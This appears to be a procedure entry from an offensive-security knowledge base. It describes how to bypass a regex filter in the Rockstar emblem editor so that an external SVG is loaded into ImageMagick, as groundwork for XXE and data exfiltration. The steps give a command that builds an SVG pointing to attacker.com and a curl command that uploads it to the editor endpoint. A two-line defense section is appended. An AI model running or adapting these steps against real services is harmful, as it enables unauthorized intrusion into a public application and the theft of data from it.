---
tags:
  - xxe
  - bypass
  - svg
type: procedure
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/create-malicious-svg]]'
  - '[[commands/upload-svg-payload]]'
platforms:
  - Web
  - Windows
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: f5b90fe0-24c7-4cbd-a4af-be6207fd5ddb
created_at: '2025-12-13T09:00:28.120Z'
updated_at: '2025-12-13T09:00:28.120Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass Regex Filter to Load External SVG

## Summary

This procedure bypasses regex filters in the emblem editor to load arbitrary external SVG data into ImageMagick for further exploitation.

## Description

The attack involves using double forward slashes in URLs to mimic SMB-like paths, allowing external SVGs to be loaded despite input validation. This sets the stage for XXE or other injections in the SVG to PNG conversion process.

## Requirements

1. Access to the Rockstar emblem editor
2. Ability to host files on an external server (attacker.com)
3. Tools for creating and uploading SVG files

## Defense

Defensive measures and detection strategies:

- Implement strict allowlisting for external URLs
- Monitor for anomalous URL patterns in requests

## Objectives

1. Load malicious external SVG
2. Evade regex-based input filters
3. Prepare for data exfiltration

## Instructions

### Step 1: Create Malicious SVG

**Context**: Generate an SVG that references an external malicious file using double slashes.

**Command** ([[commands/create-malicious-svg]]):
```bash
echo '<rect fill="url(//attacker.com/malicious.svg#exploit)">' > malicious.svg
```

> This creates an SVG element that loads external content, bypassing filters.

### Step 2: Upload Payload

**Context**: Submit the SVG to the emblem editor for processing.

**Command** ([[commands/upload-svg-payload]]):
```bash
curl -X POST -F 'file=@malicious.svg' https://emblem-editor-endpoint
```

> Uploads the file to trigger ImageMagick conversion.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/create-malicious-svg]]
- [[commands/upload-svg-payload]]

## Tools Used

- [[tools/ImageMagick]]

## Tags

- [[xxe]]
- [[bypass]]
